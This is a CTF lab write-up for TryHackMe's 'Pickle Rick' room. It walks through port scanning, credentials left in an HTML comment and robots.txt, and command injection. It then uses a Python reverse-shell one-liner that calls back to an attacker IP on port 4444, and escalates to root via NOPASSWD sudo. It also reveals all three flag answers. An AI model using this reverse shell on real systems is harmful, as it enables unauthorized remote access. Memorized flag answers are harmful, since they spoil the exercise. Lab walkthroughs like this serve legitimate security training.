🥒 Pickle Rick — TryHackMe Write-Up

## 📌 Information

| Parameter | Value |
|-----------|-------|
| Platform | TryHackMe |
| Difficulty | Easy |
| Topic | Web Exploitation, Command Injection |

---

## 🎯 Objective

Help Rick turn back from a pickle into a human by finding **3 secret ingredients**.

---

## 🔍 Reconnaissance

### Port Scanning (Nmap)

```bash
nmap -sV -sC <TARGET_IP>
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.2p1 |
| 80 | HTTP | Apache 2.4.41 |

### Web Page Analysis

Found in HTML source code:
```html
<!-- Username: R1ckRul3s -->
```

### robots.txt

```
Wubbalubbadubdub
```

✅ **Credentials:** `R1ckRul3s` : `Wubbalubbadubdub`

---

## 🚪 Initial Access

Logged into `/login.php` → Command Panel discovered

### Command Injection
In Command Panel: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

#### 1st Ingredient
```bash
cat Sup3rS3cretPickl3Ingred.txt
```
> 🥒 **mr. meeseek hair**

---

## 📈 Post-Exploitation

#### 2nd Ingredient
```bash
cat /home/rick/"second ingredients"
```
> 😢 **1 jerry tear**

---

## 🔓 Privilege Escalation

```bash
sudo -l
# (ALL) NOPASSWD: ALL

sudo su
cat /root/3rd.txt
```
> 🧪 **fleeb juice**

---

## 🏁 All Ingredients

| # | Ingredient | Location |
|---|------------|----------|
| 1 | mr. meeseek hair | /var/www/html/ |
| 2 | 1 jerry tear | /home/rick/ |
| 3 | fleeb juice | /root/ |

---

## 💡 Vulnerabilities Found

- ❌ Credentials in HTML comments
- ❌ Password in robots.txt
- ❌ Command Injection
- ❌ Misconfigured sudo (NOPASSWD: ALL)

---

## 🛠️ Tools Used

- Nmap
- Gobuster
- Netcat

